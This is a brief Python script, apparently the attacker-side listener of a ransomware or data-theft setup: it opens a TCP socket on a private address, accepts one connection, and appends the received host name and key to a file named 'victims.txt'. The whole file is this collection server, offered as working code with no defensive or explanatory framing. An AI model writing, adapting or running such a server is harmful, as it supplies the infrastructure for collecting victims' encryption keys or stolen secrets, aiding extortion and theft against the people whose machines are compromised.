import socket

ipAddr = '192.168.43.65'
port = 4555

print('creating socket')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((ipAddr, port))
    print('listening for connections...')
    s.listen()
    conn, addr = s.accept()
    print(f'connection from {addr} established')
    with conn:
        while True:
            hostAndKey = conn.recv(1024).decode()
            with open('victims.txt', 'a') as f:
                f.write(hostAndKey+'\n')
            break
        print('connection completed and closed')
